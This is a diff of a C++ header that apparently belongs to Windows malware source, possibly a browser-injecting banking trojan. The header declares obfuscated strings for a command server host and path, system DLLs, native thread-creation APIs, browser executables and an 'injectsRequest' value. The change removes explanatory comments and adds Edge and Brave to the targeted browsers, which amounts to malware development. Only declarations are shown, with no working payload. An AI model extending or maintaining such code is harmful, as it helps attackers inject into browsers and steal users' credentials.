@@ -3,7 +3,7 @@
 
 #define ENC_STR_A
 #if _MSC_VER >= 1900
-// Refer to https://en.cppreference.com/w/cpp/language/user_literal
+
 inline const char* operator "" END_ENC_STR(const char* str, size_t n)
 {
     return str;
@@ -1110,10 +1110,8 @@ namespace Funcs
 
 namespace Strs
 {
-   //server
    extern const char *host[];
    extern const char *path;
-   //dlls
    extern const char *user32;
    extern const char *kernel32;
    extern const char *kernelBase;
@@ -1133,7 +1131,7 @@ namespace Strs
    extern wchar_t *wKernel32;
    extern wchar_t *wNtdll;
    extern wchar_t *wWininet;
-   //funcs
+
    extern const char *wideCharToMultiByte;
    extern const char *messageBoxA;
    extern const char *getWindowsDirectoryA;
@@ -1300,7 +1298,7 @@ namespace Strs
    extern const char *ldrGetProcedureAddress;
    extern const char *rtlFreeUnicodeString;
    extern const char *rtlCreateUserThread;
-   //misc
+
    extern const char *helloWorld;
    extern const char *exeExt;
    extern const char *fileDiv;
@@ -1326,6 +1324,8 @@ namespace Strs
    extern const char *explorerExe;
    extern const char *firefoxExe;
    extern const char *chromeExe;
+   extern const char *edgeExe;
+   extern const char *braveExe;
    extern const char *iexploreExe;
    extern const char *powershell;
    extern const char *injectsRequest;
